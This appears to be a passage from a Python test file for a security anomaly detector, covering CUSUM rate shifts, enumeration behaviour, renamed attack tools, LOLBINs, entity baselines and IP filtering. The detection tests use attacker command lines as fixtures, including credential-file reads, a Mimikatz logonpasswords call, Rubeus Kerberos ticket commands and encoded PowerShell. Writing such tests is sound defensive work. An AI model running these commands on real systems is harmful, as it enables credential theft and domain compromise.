    because the sustained 50% increase accumulates evidence.
    """
    entries = _make_ewma_entries("compromised", [10, 10, 10, 15, 15, 15, 15, 15])
    anomalies, _ = detect_anomalies(entries)
    cusum = [a for a in anomalies if a["detection_method"] == "cusum"]
    assert len(cusum) >= 1, f"Expected CUSUM anomaly, got {[a['detection_method'] for a in anomalies]}"
    assert cusum[0]["user"] == "compromised"


def _make_ewma_entries(user: str, counts: list[int], base_hour: int = 10) -> list[dict]:
    """Create endpoint entries with given event counts per 5-min bin.

    Args:
        user: Username.
        counts: List of event counts per 5-min bin.
        base_hour: Starting hour (default 10:00 UTC, within business hours).

    Returns:
        List of log entry dicts.
    """
    entries = []
    for bin_idx, count in enumerate(counts):
        minute = base_hour * 60 + bin_idx * 5
        hour = minute // 60
        mins = minute % 60
        ts = f"2026-01-15T{hour:02d}:{mins:02d}:00.000Z"
        for _ in range(count):
            entries.append({
                "user": user,
                "action": "execute",
                "process": "/bin/bash",
                "type": "endpoint",
                "timestamp": ts,
            })
    return entries


def test_cusum_no_alert_on_steady_rate():
    """CUSUM does not flag a user with consistent event rate."""
    entries = _make_ewma_entries("normal", [10, 10, 11, 10, 9, 10, 11, 10])
    anomalies, _ = detect_anomalies(entries)
    cusum = [a for a in anomalies if a["detection_method"] == "cusum"]
    assert len(cusum) == 0, f"CUSUM should not flag steady rate, got {cusum}"


def test_cusum_no_alert_on_few_bins():
    """CUSUM requires at least 3 bins."""
    entries = _make_ewma_entries("sparse", [10, 10])
    anomalies, _ = detect_anomalies(entries)
    cusum = [a for a in anomalies if a["detection_method"] == "cusum"]
    assert len(cusum) == 0


def test_cusum_sensitivity_zero_skips():
    """CUSUM is skipped when sensitivity is 0."""
    entries = _make_ewma_entries("compromised", [10, 10, 10, 15, 15, 15, 15, 15])
    anomalies, _ = detect_anomalies(entries, thresholds={"cusum_sensitivity": 0.0})
    cusum = [a for a in anomalies if a["detection_method"] == "cusum"]
    assert len(cusum) == 0


def test_cusum_detects_drop():
    """CUSUM flags a sustained drop in event rate (service degradation)."""
    entries = _make_ewma_entries("degraded", [20, 20, 20, 5, 5, 5, 5, 5])
    anomalies, _ = detect_anomalies(entries)
    cusum = [a for a in anomalies if a["detection_method"] == "cusum"]
    assert len(cusum) >= 1
    assert cusum[0]["type"] == "cusum_drop"


def test_cusum_one_alert_per_user():
    """CUSUM produces at most one alert per user."""
    entries = _make_ewma_entries("compromised", [10, 10, 10, 15, 15, 15, 15, 15, 20, 25])
    anomalies, _ = detect_anomalies(entries)
    cusum = [a for a in anomalies if a["detection_method"] == "cusum"]
    assert len(cusum) <= 1


# --- Enumeration behavior detection ---

def _make_enum_entries_linux(user: str = "attacker", host: str = "linux01") -> list[dict]:
    """Create endpoint entries simulating a Linux enumeration script.

    Simulates a renamed LinEnum.sh that spawns many child processes
    and accesses sensitive paths.
    """
    base_ts = "2026-01-15T10:00:00.000Z"
    entries = []

    # Parent process spawning many children
    for i in range(15):
        ts = f"2026-01-15T10:0{i // 6}:{(i % 6) * 10:02d}:00.000Z"
        entries.append({
            "user": user,
            "host": host,
            "action": "process_create",
            "type": "endpoint",
            "process": f"/bin/{['find', 'cat', 'grep', 'ls', 'whoami', 'id', 'uname', 'hostname', 'ifconfig', 'ps', 'netstat', 'ss', 'crontab', 'systemctl', 'dpkg'][i]}",
            "parent_process": "/home/ubuntu/syscheck.sh",
            "command_line": f"bash syscheck.sh --phase-{i}",
            "timestamp": ts,
        })

    # Sensitive file access
    for path in ["/etc/passwd", "/etc/shadow", "/etc/hosts", "/etc/crontab", "/.ssh/authorized_keys"]:
        entries.append({
            "user": user,
            "host": host,
            "action": "file_create",
            "type": "endpoint",
            "process": "/home/ubuntu/syscheck.sh",
            "target_file": path,
            "timestamp": base_ts,
        })

    # Enumeration command patterns
    for cmd in ["cat /etc/passwd", "find / -name .htpasswd", "uname -a", "whoami", "netstat -tulpn"]:
        entries.append({
            "user": user,
            "host": host,
            "action": "process_create",
            "type": "endpoint",
            "process": "/bin/bash",
            "parent_process": "/home/ubuntu/syscheck.sh",
            "command_line": cmd,
            "timestamp": base_ts,
        })

    return entries


def _make_enum_entries_windows(user: str = "attacker", host: str = "win01") -> list[dict]:
    """Create endpoint entries simulating a Windows enumeration script.

    Simulates a renamed WinPEAS that runs system info commands
    and accesses sensitive registry keys.
    """
    base_ts = "2026-01-15T10:00:00.000Z"
    entries = []

    # Parent process spawning many children
    for i in range(12):
        ts = f"2026-01-15T10:0{i // 6}:{(i % 6) * 10:02d}:00.000Z"
        entries.append({
            "user": user,
            "host": host,
            "action": "process_create",
            "type": "endpoint",
            "process": f"C:\\Windows\\{['systeminfo.exe', 'whoami.exe', 'net.exe', 'ipconfig.exe', 'netstat.exe', 'tasklist.exe', 'wmic.exe', 'reg.exe', 'cmdkey.exe', 'vaultcmd.exe', 'dir.exe', 'type.exe'][i]}",
            "parent_process": "C:\\Users\\Public\\healthcheck.bat",
            "command_line": f"cmd /c healthcheck.bat --step-{i}",
            "timestamp": ts,
        })

    # Sensitive file access (Windows paths)
    for path in ["C:\\Windows\\Temp\\dump.txt", "C:\\Users\\admin\\.ssh\\id_rsa", "C:\\Windows\\System32\\config\\SAM"]:
        entries.append({
            "user": user,
            "host": host,
            "action": "file_create",
            "type": "endpoint",
            "process": "C:\\Users\\Public\\healthcheck.bat",
            "target_file": path,
            "timestamp": base_ts,
        })

    # Enumeration command patterns (Windows)
    for cmd in ["systeminfo", "whoami /all", "net user", "netstat -ano", "reg query hklm\\software"]:
        entries.append({
            "user": user,
            "host": host,
            "action": "process_create",
            "type": "endpoint",
            "process": "C:\\Windows\\System32\\cmd.exe",
            "parent_process": "C:\\Users\\Public\\healthcheck.bat",
            "command_line": cmd,
            "timestamp": base_ts,
        })

    return entries


def test_enum_detects_linux_child_spawning():
    """Enumeration behavior flags a renamed script spawning many children."""
    entries = _make_enum_entries_linux()
    anomalies, _ = detect_anomalies(entries)
    enum = [a for a in anomalies if a["detection_method"] == "enumeration_behavior"]
    assert len(enum) >= 1, f"Expected enumeration anomaly, got {[a['detection_method'] for a in anomalies]}"
    assert enum[0]["user"] == "attacker"


def test_enum_detects_windows_child_spawning():
    """Enumeration behavior flags a renamed Windows script."""
    entries = _make_enum_entries_windows()
    anomalies, _ = detect_anomalies(entries)
    enum = [a for a in anomalies if a["detection_method"] == "enumeration_behavior"]
    assert len(enum) >= 1, f"Expected enumeration anomaly, got {[a['detection_method'] for a in anomalies]}"
    assert enum[0]["user"] == "attacker"


def test_enum_detects_sensitive_path_access():
    """Enumeration behavior flags processes accessing multiple sensitive paths."""
    entries = []
    for path in ["/etc/passwd", "/etc/shadow", "/etc/hosts", "/etc/crontab"]:
        entries.append({
            "user": "attacker",
            "host": "linux01",
            "action": "file_create",
            "type": "endpoint",
            "process": "/home/ubuntu/renamed_script.sh",
            "target_file": path,
            "timestamp": "2026-01-15T10:00:00.000Z",
        })
    anomalies, _ = detect_anomalies(entries)
    enum = [a for a in anomalies if a["detection_method"] == "enumeration_behavior"]
    assert len(enum) >= 1


def test_enum_detects_command_patterns():
    """Enumeration behavior flags users running many enumeration commands."""
    entries = []
    for cmd in ["cat /etc/passwd", "find / -name .htpasswd", "uname -a", "whoami", "netstat -tulpn"]:
        entries.append({
            "user": "attacker",
            "host": "linux01",
            "action": "process_create",
            "type": "endpoint",
            "process": "/bin/bash",
            "command_line": cmd,
            "timestamp": "2026-01-15T10:00:00.000Z",
        })
    anomalies, _ = detect_anomalies(entries)
    enum = [a for a in anomalies if a["detection_method"] == "enumeration_behavior"]
    assert len(enum) >= 1


def test_enum_no_alert_on_normal_activity():
    """Normal activity does not trigger enumeration behavior."""
    entries = []
    for i in range(5):
        entries.append({
            "user": "normaluser",
            "host": "linux01",
            "action": "process_create",
            "type": "endpoint",
            "process": "/bin/ls",
            "parent_process": "/bin/bash",
            "command_line": "ls -la",
            "timestamp": "2026-01-15T10:00:00.000Z",
        })
    anomalies, _ = detect_anomalies(entries)
    enum = [a for a in anomalies if a["detection_method"] == "enumeration_behavior"]
    assert len(enum) == 0


def test_enum_sensitivity_zero_skips():
    """Enumeration behavior is skipped when sensitivity is 0."""
    entries = _make_enum_entries_linux()
    anomalies, _ = detect_anomalies(entries, thresholds={"enumeration_sensitivity": 0.0})
    enum = [a for a in anomalies if a["detection_method"] == "enumeration_behavior"]
    assert len(enum) == 0


def test_enum_system_parents_not_flagged():
    """System parents that legitimately spawn many children are not flagged."""
    entries = []
    for i in range(15):
        entries.append({
            "user": "system",
            "host": "win01",
            "action": "process_create",
            "type": "endpoint",
            "process": f"C:\\Windows\\System32\\svchost{i}.exe",
            "parent_process": "C:\\Windows\\System32\\services.exe",
            "timestamp": "2026-01-15T10:00:00.000Z",
        })
    anomalies, _ = detect_anomalies(entries)
    enum = [a for a in anomalies if a["detection_method"] == "enumeration_behavior"]
    # services.exe is in SYSTEM_PARENTS, should not be flagged for child spawning
    child_spawn = [a for a in enum if "spawned" in a.get("details", "")]
    assert len(child_spawn) == 0


def test_lolbin_splunk_not_flagged():
    """Splunk processes from legitimate paths are not flagged as LOLBINs."""
    entries = [
        {
            "user": "NT AUTHORITY\\SYSTEM",
            "type": "endpoint",
            "process": "C:\\Program Files\\SplunkUniversalForwarder\\bin\\splunk-powershell.exe",
            "command_line": "\"C:\\Program Files\\SplunkUniversalForwarder\\bin\\splunk-powershell.exe\" --ps2",
            "timestamp": "2026-01-15T10:00:00.000Z",
        },
        {
            "user": "NT AUTHORITY\\SYSTEM",
            "type": "endpoint",
            "process": "C:\\Program Files\\SplunkUniversalForwarder\\bin\\splunk-netmon.exe",
            "command_line": "\"C:\\Program Files\\SplunkUniversalForwarder\\bin\\splunk-netmon.exe\"",
            "timestamp": "2026-01-15T10:00:01.000Z",
        },
    ]
    anomalies, _ = detect_anomalies(entries)
    lolbin = [a for a in anomalies if a.get("detection_method") == "lolbin"]
    assert len(lolbin) == 0


def test_lolbin_non_legitimate_path_flagged():
    """PowerShell from a non-legitimate path IS flagged as LOLBIN."""
    entries = [
        {
            "user": "ATTACKRANGE\\lowpriv",
            "type": "endpoint",
            "process": "C:\\Temp\\powershell.exe",
            "command_line": "powershell.exe -enc JABjAGwAaQBlAG4AdAA=",
            "timestamp": "2026-01-15T10:00:00.000Z",
        },
    ]
    anomalies, _ = detect_anomalies(entries)
    lolbin = [a for a in anomalies if a.get("detection_method") == "lolbin"]
    assert len(lolbin) >= 1


def test_renamed_rubeus_detected():
    """Rubeus renamed to Rsynctool.exe is caught by command-line signatures."""
    entries = [
        {
            "user": "ATTACKRANGE\\lowpriv",
            "type": "endpoint",
            "process": "C:\\Rsynctool.exe",
            "command_line": "Rsynctool.exe asktgs /service:cifs/ar-win-dc.attackrange.local /nowrap /ptt",
            "timestamp": "2026-01-15T10:00:00.000Z",
        },
    ]
    anomalies, _ = detect_anomalies(entries)
    renamed = [a for a in anomalies if a.get("detection_method") == "renamed_tool"]
    assert len(renamed) >= 1
    assert renamed[0]["tool_name"] == "Rubeus"
    assert "T1558" in renamed[0].get("mitre_ids", [])


def test_renamed_rubeus_diamond_detected():
    """Rubeus diamond command is detected."""
    entries = [
        {
            "user": "ATTACKRANGE\\lowpriv",
            "type": "endpoint",
            "process": "C:\\Rsynctool.exe",
            "command_line": "Rsynctool.exe diamond /user:lowpriv /password:secret /krbkey:abc123 /enctype:aes",
            "timestamp": "2026-01-15T10:00:00.000Z",
        },
    ]
    anomalies, _ = detect_anomalies(entries)
    renamed = [a for a in anomalies if a.get("detection_method") == "renamed_tool"]
    assert len(renamed) >= 1
    assert renamed[0]["tool_name"] == "Rubeus"


def test_renamed_mimikatz_detected():
    """Mimikatz renamed to svchost-update.exe is caught by command-line signatures."""
    entries = [
        {
            "user": "ATTACKRANGE\\admin",
            "type": "endpoint",
            "process": "C:\\Temp\\svchost-update.exe",
            "command_line": "svchost-update.exe sekurlsa::logonpasswords",
            "timestamp": "2026-01-15T10:00:00.000Z",
        },
    ]
    anomalies, _ = detect_anomalies(entries)
    renamed = [a for a in anomalies if a.get("detection_method") == "renamed_tool"]
    assert len(renamed) >= 1
    assert renamed[0]["tool_name"] == "Mimikatz"


def test_renamed_tool_not_flagged_if_name_matches():
    """If the process is actually named 'rubeus', it's caught by known_attack_script, not renamed_tool."""
    entries = [
        {
            "user": "ATTACKRANGE\\lowpriv",
            "type": "endpoint",
            "process": "C:\\Tools\\rubeus.exe",
            "command_line": "rubeus.exe asktgt /user:admin /password:secret /domain:corp.local",
            "timestamp": "2026-01-15T10:00:00.000Z",
        },
    ]
    anomalies, _ = detect_anomalies(entries)
    renamed = [a for a in anomalies if a.get("detection_method") == "renamed_tool"]
    # Should NOT be flagged as renamed_tool since the process name contains "rubeus"
    assert len(renamed) == 0
    # But should be caught by known_attack_script
    attack_script = [a for a in anomalies if a.get("detection_method") == "attack_script"]
    assert len(attack_script) >= 1


# --- Entity-aware detection tests ---

def _make_profile_store(tmp_path, users=None, hosts=None, ips=None):
    """Helper to create an EntityProfileStore with pre-populated profiles."""
    from nabla.baselines import EntityProfileStore, UserProfile, HostProfile, IPProfile, EWMAProfile
    path = str(tmp_path / "profiles.json")
    store = EntityProfileStore(path)
    if users:
        for uid, profile_data in users.items():
            p = store.get_or_create_user(uid)
            for k, v in profile_data.items():
                if k == "observation_count":
                    p.observation_count = v
                elif k == "typical_event_count":
                    p.typical_event_count = EWMAProfile(**v) if isinstance(v, dict) else v
                elif k == "typical_ips":
                    p.typical_ips = set(v)
                elif k == "typical_hours":
                    p.typical_hours = set(v)
                elif k == "auth_failure_ratio":
                    p.auth_failure_ratio = EWMAProfile(**v) if isinstance(v, dict) else v
    if hosts:
        for hid, profile_data in hosts.items():
            p = store.get_or_create_host(hid)
            for k, v in profile_data.items():
                if k == "observation_count":
                    p.observation_count = v
                elif k == "typical_processes":
                    p.typical_processes = set(v)
                elif k == "typical_users":
                    p.typical_users = set(v)
                elif k == "typical_auth_failure_ratio":
                    p.typical_auth_failure_ratio = EWMAProfile(**v) if isinstance(v, dict) else v
    if ips:
        for iid, profile_data in ips.items():
            p = store.get_or_create_ip(iid)
            for k, v in profile_data.items():
                if k == "observation_count":
                    p.observation_count = v
    return store


class TestEntityZScore:
    """Tests for entity-aware z-score detection (method 2)."""

    def test_entity_z_score_with_warm_profile(self, tmp_path):
        """User with warm entity baseline gets entity_z_score instead of batch z_score."""
        store = _make_profile_store(
            tmp_path,
            users={
                "jsmith": {
                    "observation_count": 5,
                    "typical_event_count": {"value": 10.0, "variance": 4.0, "alpha": 0.3},
                },
            },
        )
        # jsmith has 100 events this run — way above their EWMA of 10
        entries = [{"user": "jsmith", "action": "login", "timestamp": "2025-01-15T09:00:00Z"}] * 100
        anomalies, _ = detect_anomalies(entries, entity_profiles=store)
        entity_z = [a for a in anomalies if a.get("detection_method") == "entity_z_score"]
        assert len(entity_z) >= 1
        assert entity_z[0]["entity_baseline"] is True

    def test_no_entity_z_score_without_profiles(self, tmp_path):
        """Without entity_profiles, falls back to batch z_score."""
        entries = [{"user": "jsmith", "action": "login", "timestamp": "2025-01-15T09:00:00Z"}] * 100
        anomalies, _ = detect_anomalies(entries, entity_profiles=None)
        entity_z = [a for a in anomalies if a.get("detection_method") == "entity_z_score"]
        assert len(entity_z) == 0

    def test_no_entity_z_score_during_warmup(self, tmp_path):
        """Entity with < 3 observations doesn't use entity baseline."""
        store = _make_profile_store(
            tmp_path,
            users={
                "jsmith": {
                    "observation_count": 2,  # Not enough for warm-up
                    "typical_event_count": {"value": 10.0, "variance": 4.0, "alpha": 0.3},
                },
            },
        )
        entries = [{"user": "jsmith", "action": "login", "timestamp": "2025-01-15T09:00:00Z"}] * 100
        anomalies, _ = detect_anomalies(entries, entity_profiles=store)
        entity_z = [a for a in anomalies if a.get("detection_method") == "entity_z_score"]
        assert len(entity_z) == 0  # Falls back to batch z_score


class TestEntityAuthFailure:
    """Tests for entity-aware auth failure detection (method 3)."""

    def test_entity_auth_failure_spike(self, tmp_path):
        """User with normally low auth failure ratio gets flagged on spike."""
        store = _make_profile_store(
            tmp_path,
            users={
                "jsmith": {
                    "observation_count": 5,
                    "auth_failure_ratio": {"value": 0.05, "variance": 0.001, "alpha": 0.3},
                },
            },
        )
        # 80% failure rate — way above 5% EWMA
        entries = [
            {"user": "jsmith", "action": "login_failure", "source_ip": "10.0.1.50", "timestamp": "2025-01-15T09:00:00Z"},
            {"user": "jsmith", "action": "login_failure", "source_ip": "10.0.1.50", "timestamp": "2025-01-15T09:01:00Z"},
            {"user": "jsmith", "action": "login_failure", "source_ip": "10.0.1.50", "timestamp": "2025-01-15T09:02:00Z"},
            {"user": "jsmith", "action": "login_failure", "source_ip": "10.0.1.50", "timestamp": "2025-01-15T09:03:00Z"},
            {"user": "jsmith", "action": "login_success", "source_ip": "10.0.1.50", "timestamp": "2025-01-15T09:04:00Z"},
        ]
        anomalies, _ = detect_anomalies(entries, entity_profiles=store)
        entity_auth = [a for a in anomalies if a.get("detection_method") == "entity_auth_failure"]
        assert len(entity_auth) >= 1


class TestEntityOffHours:
    """Tests for entity-aware off-hours detection (method 4)."""

    def test_entity_off_hours_with_typical_hours(self, tmp_path):
        """User with typical hours 9-17 flagged for 23:00 activity."""
        store = _make_profile_store(
            tmp_path,
            users={
                "jsmith": {
                    "observation_count": 5,
                    "typical_hours": {9, 10, 11, 12, 13, 14, 15, 16, 17},
                },
            },
        )
        entries = [
            {"user": "jsmith", "action": "login", "source_ip": "10.0.1.50",
             "timestamp": f"2025-01-15T23:0{i}:00Z"} for i in range(4)
        ]
        anomalies, _ = detect_anomalies(entries, entity_profiles=store)
        entity_oh = [a for a in anomalies if a.get("detection_method") == "entity_off_hours"]
        assert len(entity_oh) >= 1
        assert entity_oh[0]["entity_baseline"] is True

    def test_night_shift_worker_not_flagged(self, tmp_path):
        """Night-shift worker (typical hours 22-6) not flagged for off-hours."""
        store = _make_profile_store(
            tmp_path,
            users={
                "nightowl": {
                    "observation_count": 5,
                    "typical_hours": {22, 23, 0, 1, 2, 3, 4, 5},
                },
            },
        )
        entries = [
            {"user": "nightowl", "action": "login", "source_ip": "10.0.1.50",
             "timestamp": f"2025-01-15T23:0{i}:00Z"} for i in range(4)
        ]
        anomalies, _ = detect_anomalies(entries, entity_profiles=store)
        entity_oh = [a for a in anomalies if a.get("detection_method") == "entity_off_hours"]
        assert len(entity_oh) == 0  # Not flagged — 23:00 is in their typical hours


class TestEntityNewIP:
    """Tests for entity-aware new IP detection (method 5)."""

    def test_entity_new_ip_flagged(self, tmp_path):
        """User with known IPs flagged for new IPs."""
        store = _make_profile_store(
            tmp_path,
            users={
                "jsmith": {
                    "observation_count": 5,
                    "typical_ips": {"8.8.8.8", "1.2.3.4"},
                },
            },
        )
        entries = [
            {"user": "jsmith", "source_ip": "45.33.32.156", "action": "login", "timestamp": "2025-01-15T09:00:00Z"},
            {"user": "jsmith", "source_ip": "9.9.9.9", "action": "login", "timestamp": "2025-01-15T09:01:00Z"},
        ]
        anomalies, _ = detect_anomalies(entries, entity_profiles=store)
        new_ip = [a for a in anomalies if a.get("detection_method") == "entity_new_ip"]
        assert len(new_ip) >= 1

    def test_known_ips_not_flagged(self, tmp_path):
        """User connecting from known IPs not flagged."""
        store = _make_profile_store(
            tmp_path,
            users={
                "jsmith": {
                    "observation_count": 5,
                    "typical_ips": {"8.8.8.8", "1.2.3.4"},
                },
            },
        )
        entries = [
            {"user": "jsmith", "source_ip": "8.8.8.8", "action": "login", "timestamp": "2025-01-15T09:00:00Z"},
            {"user": "jsmith", "source_ip": "1.2.3.4", "action": "login", "timestamp": "2025-01-15T09:01:00Z"},
        ]
        anomalies, _ = detect_anomalies(entries, entity_profiles=store)
        new_ip = [a for a in anomalies if a.get("detection_method") == "entity_new_ip"]
        assert len(new_ip) == 0


class TestEntityActivitySpike:
    """Tests for entity-aware activity spike detection (method 6)."""

    def test_entity_activity_spike(self, tmp_path):
        """User with normally 10 events gets flagged for 100 events."""
        store = _make_profile_store(
            tmp_path,
            users={
                "jsmith": {
                    "observation_count": 5,
                    "typical_event_count": {"value": 10.0, "variance": 2.0, "alpha": 0.3},
                },
            },
        )
        entries = [{"user": "jsmith", "action": "login", "timestamp": "2025-01-15T09:00:00Z"}] * 100
        anomalies, _ = detect_anomalies(entries, entity_profiles=store)
        spike = [a for a in anomalies if a.get("detection_method") == "entity_activity_spike"]
        assert len(spike) >= 1


class TestEntityNewProcess:
    """Tests for entity-aware new process detection (method 10)."""

    def test_entity_new_process_on_host(self, tmp_path):
        """Host with known processes flagged for new suspicious processes."""
        store = _make_profile_store(
            tmp_path,
            hosts={
                "DC01": {
                    "observation_count": 5,
                    "typical_processes": {"svchost", "lsass", "dns", "explorer"},
                },
            },
        )
        entries = [
            {"type": "endpoint", "host": "DC01", "process": "mimikatz.exe",
             "action": "execute", "timestamp": "2025-01-15T09:00:00Z"},
            {"type": "endpoint", "host": "DC01", "process": "powershell.exe",
             "action": "execute", "timestamp": "2025-01-15T09:01:00Z"},
            {"type": "endpoint", "host": "DC01", "process": "certutil.exe",
             "action": "execute", "timestamp": "2025-01-15T09:02:00Z"},
            {"type": "endpoint", "host": "DC01", "process": "mshta.exe",
             "action": "execute", "timestamp": "2025-01-15T09:03:00Z"},
        ]
        anomalies, _ = detect_anomalies(entries, entity_profiles=store)
        new_proc = [a for a in anomalies if a.get("detection_method") in ("entity_new_process", "entity_unusual_process")]
        assert len(new_proc) >= 1


class TestEntityBehaviorComposite:
    """Tests for entity behavior composite anomaly (method 22)."""

    def test_user_composite_anomaly(self, tmp_path):
        """User with multiple behavioral deviations gets composite anomaly."""
        store = _make_profile_store(
            tmp_path,
            users={
                "jsmith": {
                    "observation_count": 5,
                    "typical_event_count": {"value": 10.0, "variance": 2.0, "alpha": 0.3},
                    "typical_ips": {"8.8.8.8"},
                    "typical_hours": {9, 10, 11, 12, 13, 14, 15, 16, 17},
                    "auth_failure_ratio": {"value": 0.05, "variance": 0.001, "alpha": 0.3},
                },
            },
        )
        # High event count + new IP + off-hours + auth failures = composite
        entries = [
            {"user": "jsmith", "source_ip": "45.33.32.156", "action": "login_failure",
             "timestamp": "2025-01-15T23:00:00Z"},
        ] * 50
        anomalies, _ = detect_anomalies(entries, entity_profiles=store)
        composite = [a for a in anomalies if a.get("detection_method") == "entity_behavior_composite"]
        assert len(composite) >= 1
        assert composite[0]["composite_score"] >= 0.5

    def test_host_composite_anomaly(self, tmp_path):
        """Host with new processes and new users gets composite anomaly."""
        store = _make_profile_store(
            tmp_path,
            hosts={
                "DC01": {
                    "observation_count": 5,
                    "typical_processes": {"svchost", "lsass", "dns"},
                    "typical_users": {"admin", "system"},
                },
            },
        )
        entries = [
            {"type": "endpoint", "host": "DC01", "user": "hacker",
             "process": "mimikatz.exe", "action": "execute",
             "timestamp": "2025-01-15T09:00:00Z"},
            {"type": "endpoint", "host": "DC01", "user": "hacker",
             "process": "powershell.exe", "action": "execute",
             "timestamp": "2025-01-15T09:01:00Z"},
            {"type": "endpoint", "host": "DC01", "user": "hacker",
             "process": "certutil.exe", "action": "execute",
             "timestamp": "2025-01-15T09:02:00Z"},
        ]
        anomalies, _ = detect_anomalies(entries, entity_profiles=store)
        composite = [a for a in anomalies if a.get("detection_method") == "entity_host_composite"]
        assert len(composite) >= 1

    def test_no_composite_without_profiles(self):
        """Composite anomaly not triggered without entity_profiles."""
        entries = [
            {"user": "jsmith", "source_ip": "45.33.32.156", "action": "login_failure",
             "timestamp": "2025-01-15T23:00:00Z"},
        ] * 50
        anomalies, _ = detect_anomalies(entries, entity_profiles=None)
        composite = [a for a in anomalies if a.get("detection_method") in ("entity_behavior_composite", "entity_host_composite")]
        assert len(composite) == 0

    def test_no_composite_during_warmup(self, tmp_path):
        """Composite anomaly not triggered during warm-up period."""
        store = _make_profile_store(
            tmp_path,
            users={
                "jsmith": {
                    "observation_count": 2,  # Not enough for warm-up
                    "typical_event_count": {"value": 10.0, "variance": 2.0, "alpha": 0.3},
                    "typical_ips": {"8.8.8.8"},
                    "typical_hours": {9, 10, 11},
                },
            },
        )
        entries = [
            {"user": "jsmith", "source_ip": "45.33.32.156", "action": "login_failure",
             "timestamp": "2025-01-15T23:00:00Z"},
        ] * 50
        anomalies, _ = detect_anomalies(entries, entity_profiles=store)
        composite = [a for a in anomalies if a.get("detection_method") == "entity_behavior_composite"]
        assert len(composite) == 0


class TestEntityBackwardCompatibility:
    """Tests that entity_profiles=None preserves existing behavior."""

    def test_detect_anomalies_without_profiles(self):
        """detect_anomalies with entity_profiles=None produces same results as before."""
        entries = [
            {"user": "jsmith", "action": "login_success", "source_ip": "8.8.8.8",
             "timestamp": "2025-01-15T09:00:00Z"},
            {"user": "jsmith", "action": "login_failure", "source_ip": "8.8.8.8",
             "timestamp": "2025-01-15T09:01:00Z"},
            {"user": "jsmith", "action": "login_failure", "source_ip": "8.8.8.8",
             "timestamp": "2025-01-15T09:02:00Z"},
            {"user": "jsmith", "action": "login_failure", "source_ip": "8.8.8.8",
             "timestamp": "2025-01-15T09:03:00Z"},
        ]
        # Should work exactly as before
        anomalies, baselines = detect_anomalies(entries, entity_profiles=None)
        entity_methods = [a for a in anomalies if a.get("entity_baseline")]
        assert len(entity_methods) == 0  # No entity-based anomalies

    def test_entity_thresholds_in_defaults(self):
        """Entity thresholds are present in DEFAULT_THRESHOLDS."""
        assert "entity_event_count_sigma" in DEFAULT_THRESHOLDS
        assert "entity_new_ip_threshold" in DEFAULT_THRESHOLDS
        assert "entity_auth_failure_sigma" in DEFAULT_THRESHOLDS
        assert "entity_new_process_threshold" in DEFAULT_THRESHOLDS
        assert "entity_new_user_threshold" in DEFAULT_THRESHOLDS
        assert "entity_behavior_composite_threshold" in DEFAULT_THRESHOLDS


# --- is_routable_ip ---

class TestIsRoutableIP:
    """Tests for the is_routable_ip helper."""

    def test_public_ipv4(self):
        """Public IPv4 addresses are routable."""
        assert is_routable_ip("8.8.8.8") is True
        assert is_routable_ip("1.2.3.4") is True
        assert is_routable_ip("45.33.32.156") is True

    def test_rfc1918_private(self):
        """RFC 1918 private addresses are NOT routable."""
        assert is_routable_ip("10.0.0.1") is False
        assert is_routable_ip("172.16.0.1") is False
        assert is_routable_ip("172.31.94.24") is False
        assert is_routable_ip("192.168.1.1") is False

    def test_loopback(self):
        """Loopback addresses are NOT routable."""
        assert is_routable_ip("127.0.0.1") is False

    def test_link_local(self):
        """Link-local addresses are NOT routable."""
        assert is_routable_ip("169.254.1.1") is False

    def test_ipv6_loopback(self):
        """IPv6 loopback is NOT routable."""
        assert is_routable_ip("::1") is False

    def test_ipv6_link_local(self):
        """IPv6 link-local is NOT routable."""
        assert is_routable_ip("fe80::1") is False

    def test_ipv6_unique_local(self):
        """IPv6 unique-local (fc00::/7) is NOT routable."""
        assert is_routable_ip("fc00::1") is False
        assert is_routable_ip("fd00::1") is False

    def test_ipv6_public(self):
        """Public IPv6 addresses ARE routable."""
        assert is_routable_ip("2607:f8b0:4004:800::200e") is True

    def test_documentation_ranges_not_routable(self):
        """Documentation/reserved ranges (RFC 5737, RFC 3849) are NOT routable."""
        assert is_routable_ip("203.0.113.1") is False  # TEST-NET-3
        assert is_routable_ip("2001:db8::1") is False  # IPv6 documentation

    def test_empty_string(self):
        """Empty string is NOT routable."""
        assert is_routable_ip("") is False

    def test_invalid_ip(self):
        """Invalid IP strings are NOT routable."""
        assert is_routable_ip("not-an-ip") is False
        assert is_routable_ip("999.999.999.999") is False

    def test_multicast(self):
        """Multicast addresses are NOT routable."""
        assert is_routable_ip("224.0.0.1") is False
        assert is_routable_ip("ff02::1") is False


# --- Private IP filtering in detection ---

class TestPrivateIPFiltering:
    """Tests that private IPs are excluded from multi_ip/multiple_source_ips detection."""

    def _make_auth_entries(self, user: str, ips: list[str]) -> list[dict]:
        """Create auth log entries with the given IPs for a user."""
        entries = []
        for i, ip in enumerate(ips):
            entries.append({
                "type": "auth",
                "user": user,
                "source_ip": ip,
                "action": "login_success",
                "timestamp": f"2026-01-15T10:{i:02d}:00Z",
            })
        return entries

    def test_private_ips_not_counted_for_multi_ip(self):
        """Multiple private IPs for the same user should NOT trigger multi_ip."""
        entries = self._make_auth_entries("testuser", [
            "172.31.94.24",   # AWS VPC private
            "172.31.47.243",  # Same VPC, different host
            "10.0.1.5",       # Another private IP
        ])
        anomalies, _ = detect_anomalies(entries)
        multi_ip = [a for a in anomalies if a.get("detection_method") == "multi_ip"]
        assert len(multi_ip) == 0

    def test_public_ips_still_counted_for_multi_ip(self):
        """Multiple public IPs for the same user SHOULD trigger multi_ip."""
        entries = self._make_auth_entries("testuser", [
            "8.8.8.8",
            "1.2.3.4",
            "45.33.32.156",
        ])
        anomalies, _ = detect_anomalies(entries)
        multi_ip = [a for a in anomalies if a.get("detection_method") == "multi_ip"]
        assert len(multi_ip) == 1

    def test_mixed_public_private_only_counts_public(self):
        """Mixed IPs: only public IPs count toward multi_ip threshold."""
        entries = self._make_auth_entries("testuser", [
            "8.8.8.8",         # Public
            "172.31.94.24",    # Private (filtered out)
            "10.0.1.5",        # Private (filtered out)
        ])
        # Only 1 public IP → below multi_ip_count threshold of 3
        anomalies, _ = detect_anomalies(entries)
        multi_ip = [a for a in anomalies if a.get("detection_method") == "multi_ip"]
        assert len(multi_ip) == 0

    def test_loopback_ipv6_filtered(self):
        """IPv6 loopback and link-local should not count toward multi_ip."""
        entries = self._make_auth_entries("testuser", [
            "::1",             # Loopback
            "fe80::1",         # Link-local
            "8.8.8.8",         # Public (only 1 public IP)
        ])
        anomalies, _ = detect_anomalies(entries)
        multi_ip = [a for a in anomalies if a.get("detection_method") == "multi_ip"]
        assert len(multi_ip) == 0


# --- New account grace period ---

class TestNewAccountGracePeriod:
